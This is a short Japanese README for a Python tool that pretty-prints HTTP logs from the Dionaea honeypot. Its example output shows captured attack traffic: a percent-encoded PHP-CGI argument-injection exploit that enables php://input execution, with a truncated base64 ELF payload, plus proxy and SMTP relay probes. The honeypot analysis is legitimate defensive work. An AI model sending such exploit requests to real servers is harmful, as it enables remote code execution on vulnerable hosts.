dionaea-http-analyzer
=====================

DionaeaのHTTPログを見やすくします.
動けばいいの気持ちで書いたので適当に編集するなりしてください.

INSTALL
=====================
```
$ pip install termcolor
```

Usage
=====================
引数にはディレクトリを指定してください.

```
$ python analysis.py <directory>
```
```
ex)
$ python analysis.py 2014-09-06
[FILE] 2014-09-16/httpd-80-218.59.238.92-Y1fNCq
GET http://proxyjudge.us/ HTTP/1.0
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
Accept: */*
Accept-Language: zh-cn
Host: proxyjudge.us
Connection: Close


[FILE] 2014-09-16/httpd-80-220.181.51.212-g8vSmz
GET / HTTP/1.0
Host: 153.120.0.175
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)
Referer: http://www.baidu.com/s?wd=www
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip
Accept-Language: en-US,*


[FILE] 2014-09-16/httpd-80-64.250.233.69-28XCCY
POST /cgi-bin/php-cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%22%79%65%73%22+%2D%64+%63%67%69%2E%66%69%78%5F%70%61%74%68%69%6E%66%6F%3D%31+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%6E HTTP/1.1
Host: 153.120.0.175
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 62243
Connection: close

<?php\x0a$bufferf = \x27f0VMRgEBAQMAAAAAAAAAAAIAAwABAAAA8ErAADQAAAAAAAAAAAAAADQAIAACACgAAAAAAAEAAAAAAAAAABDAAAAQwADRQgAA0UIAAAUAAAAAEAAAAQAAALAJAACwCQUIsAkFCAAAAAAAAAAABgAAAAAQAABBqhcZVVBYIfAHDQwAAAAAGIkAABiJAAD0AAAAiwAAAAIAAAB/P2T5f0VMRgEAAgADAA2gkwT9b7PdCDQHMIUXCyAABgAoABkAGM89d88HDwOABAjACwNzp2maBQQD9BsDyV6Q7hMbE1tte3LZdD8A+Hz4fAAQH233/QaABAUIAyxQsAkfz91mkAYCCIEDAQUI0Odm33MPAx8EAxsjCEj3tVsDIBsgAAAAAAAAJAD/BHwAADM4AAACRgMAlv//9i9saWIDZC1saW51eC5zby4yAAAEABAM9r1pAUdOVQAAAgMFBule00NRFAdKN9Y0TfcrA1AXOTtHYZvuCwA8A0ggAABNM0h3ERM+HyEUg3SDNC4mKyJONE3TNA5GTRoNgjRN0zhPMwNpmqb7ow8fHUUJP0EGG6QvSwckQQYbsEmTPQdBmqZpujADTDU6Ix5X2aZpLUQnAAAE2BDSdB8IBwUTSDckAwITawaQDNgAFhsKTdM0zRkSCygbGIAM2CAsVyWANE03Kh8MKxw2JE03MRdAQjQLgw3SDAEVNgcpdwPYIDJPZTDgjgSTXTPYCG2zWPAPKgHTnNy+uCSPD8YA/hAgTTNIbdwgLrpBuodQMA9870dA2T0G6Q9x978PCAJmkK45U2AvICY0y0G6cA/48ACAJjzZNIMzkEsBHwGa5mSzoJQA9rCxB+maQY/Aj4h1AHTdgCzQBofgL+Gn8zWDwPC/AW9dN2R7cH94FxAPtIN0zSClIB85A8Jz9jQwAf/MkB8zSNNd9Q9QcLMuzbNNYBcB/0kCkDAB/y17TmKQr9dAAwUIBAPSNR2FEVR/kGh3Tth0P6BSRA9fT7I0uEkBMw+QnhxkaQ7UAZBA4wCX5+TSkFMBEJA2AJxcmidiApFGAWw2zcnuD9QACiABAk4uzTMPygCRrwZK0hxkeZEqUAKR47Ln5PsAw5HPRQ+kOwzYD+kPDyfPyeUb7v+RjQEmkcjycQkvhg+RV84gyzPGkV7BrGkG6R874ODK/8/J5Rl7kRYBDZJ0hyEbr0ojDyOD0TSDLiDZDznLc7Y7D98C/6ySNAbpziAdD/Fx2ZyxaWC5AH9CcJIZZPkuq/+SPNl056TdD9oAD7k/Q96ANIMesHP/pGsG6W+NF9APNR3MuBk65MUEXwmePIPUdC/g4x9AkrfkObk6ABmTt2H3uOwQk9//Dw9xAc89XLI5GDCTlQ+TTQPWJX+GmyAvx9anZT2TH1dgk1+HS3ZcLZ9wk04fu5CDdE+jdgKkHzcxrKaQMK+bcHRo23878XJlYWSZFndhaXRwaWQAEWPZB7v9dgBjb25uB3QAIV9leGkM+3Zhd2MFdGVRZW4tYWNjZRd2u/1YPABmb3JrFWlnE3RpP2b/26WBX2g3cnJub19sb2NhEvbbf8oQSnZfUmVnaXNPckNsYXNT9lt733OYY5LZFXJjcHkAKBbf7rZQbAxkb3VkdnNwck69c7PtdGYPbghUJ3RvbF+5sdvNDUVuYSpnZclmB9da+71ObWVtRHBjdF0GgHNtuzWmGmVvOG0qiEha27Z2bGXCBXm5bsEH7X9d2xFrNtxs/2ZmbHVzaOVnW9tumnJtO289smM1a5Zba7VpBhQyZmluX3PtdRcWZHI0dD4mOAt97j13ZWtmbccCBm57dmvvitbqXm1wu2R1CM+5d1vybxlfSU9ftJPRtUI7bD9sGHIWLzX3Dq2bTX3PZwzCe+6uGIBzcmGB7/BSeBv7tRwMY3cTaPB0YnkQ3FlXEB
[FILE] 2014-09-16/httpd-80-220.181.51.207-bfENfM
GET / HTTP/1.0
Host: 153.120.0.175
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)
Referer: http://www.baidu.com/s?wd=www
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip
Accept-Language: en-US,*


[FILE] 2014-09-16/httpd-80-64.250.233.69-fAvocT
POST /cgi-bin/php5-cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%22%79%65%73%22+%2D%64+%63%67%69%2E%66%69%78%5F%70%61%74%68%69%6E%66%6F%3D%31+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%6E HTTP/1.1
Host: 153.120.0.175
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 62243
Connection: close

<?php\x0a$bufferf = \x27f0VMRgEBAQMAAAAAAAAAAAIAAwABAAAA8ErAADQAAAAAAAAAAAAAADQAIAACACgAAAAAAAEAAAAAAAAAABDAAAAQwADRQgAA0UIAAAUAAAAAEAAAAQAAALAJAACwCQUIsAkFCAAAAAAAAAAABgAAAAAQAABBqhcZVVBYIfAHDQwAAAAAGIkAABiJAAD0AAAAiwAAAAIAAAB/P2T5f0VMRgEAAgADAA2gkwT9b7PdCDQHMIUXCyAABgAoABkAGM89d88HDwOABAjACwNzp2maBQQD9BsDyV6Q7hMbE1tte3LZdD8A+Hz4fAAQH233/QaABAUIAyxQsAkfz91mkAYCCIEDAQUI0Odm33MPAx8EAxsjCEj3tVsDIBsgAAAAAAAAJAD/BHwAADM4AAACRgMAlv//9i9saWIDZC1saW51eC5zby4yAAAEABAM9r1pAUdOVQAAAgMFBule00NRFAdKN9Y0TfcrA1AXOTtHYZvuCwA8A0ggAABNM0h3ERM+HyEUg3SDNC4mKyJONE3TNA5GTRoNgjRN0zhPMwNpmqb7ow8fHUUJP0EGG6QvSwckQQYbsEmTPQdBmqZpujADTDU6Ix5X2aZpLUQnAAAE2BDSdB8IBwUTSDckAwITawaQDNgAFhsKTdM0zRkSCygbGIAM2CAsVyWANE03Kh8MKxw2JE03MRdAQjQLgw3SDAEVNgcpdwPYIDJPZTDgjgSTXTPYCG2zWPAPKgHTnNy+uCSPD8YA/hAgTTNIbdwgLrpBuodQMA9870dA2T0G6Q9x978PCAJmkK45U2AvICY0y0G6cA/48ACAJjzZNIMzkEsBHwGa5mSzoJQA9rCxB+maQY/Aj4h1AHTdgCzQBofgL+Gn8zWDwPC/AW9dN2R7cH94FxAPtIN0zSClIB85A8Jz9jQwAf/MkB8zSNNd9Q9QcLMuzbNNYBcB/0kCkDAB/y17TmKQr9dAAwUIBAPSNR2FEVR/kGh3Tth0P6BSRA9fT7I0uEkBMw+QnhxkaQ7UAZBA4wCX5+TSkFMBEJA2AJxcmidiApFGAWw2zcnuD9QACiABAk4uzTMPygCRrwZK0hxkeZEqUAKR47Ln5PsAw5HPRQ+kOwzYD+kPDyfPyeUb7v+RjQEmkcjycQkvhg+RV84gyzPGkV7BrGkG6R874ODK/8/J5Rl7kRYBDZJ0hyEbr0ojDyOD0TSDLiDZDznLc7Y7D98C/6ySNAbpziAdD/Fx2ZyxaWC5AH9CcJIZZPkuq/+SPNl056TdD9oAD7k/Q96ANIMesHP/pGsG6W+NF9APNR3MuBk65MUEXwmePIPUdC/g4x9AkrfkObk6ABmTt2H3uOwQk9//Dw9xAc89XLI5GDCTlQ+TTQPWJX+GmyAvx9anZT2TH1dgk1+HS3ZcLZ9wk04fu5CDdE+jdgKkHzcxrKaQMK+bcHRo23878XJlYWSZFndhaXRwaWQAEWPZB7v9dgBjb25uB3QAIV9leGkM+3Zhd2MFdGVRZW4tYWNjZRd2u/1YPABmb3JrFWlnE3RpP2b/26WBX2g3cnJub19sb2NhEvbbf8oQSnZfUmVnaXNPckNsYXNT9lt733OYY5LZFXJjcHkAKBbf7rZQbAxkb3VkdnNwck69c7PtdGYPbghUJ3RvbF+5sdvNDUVuYSpnZclmB9da+71ObWVtRHBjdF0GgHNtuzWmGmVvOG0qiEha27Z2bGXCBXm5bsEH7X9d2xFrNtxs/2ZmbHVzaOVnW9tumnJtO289smM1a5Zba7VpBhQyZmluX3PtdRcWZHI0dD4mOAt97j13ZWtmbccCBm57dmvvitbqXm1wu2R1CM+5d1vybxlfSU9ftJPRtUI7bD9sGHIWLzX3Dq2bTX3PZwzCe+6uGIBzcmGB7/BSeBv7tRwMY3cTaPB0YnkQ3FlXE
[FILE] 2014-09-16/httpd-80-111.249.113.71-L4xDGg
CONNECT mx3.mail2000.com.tw:25 HTTP/1.0
```













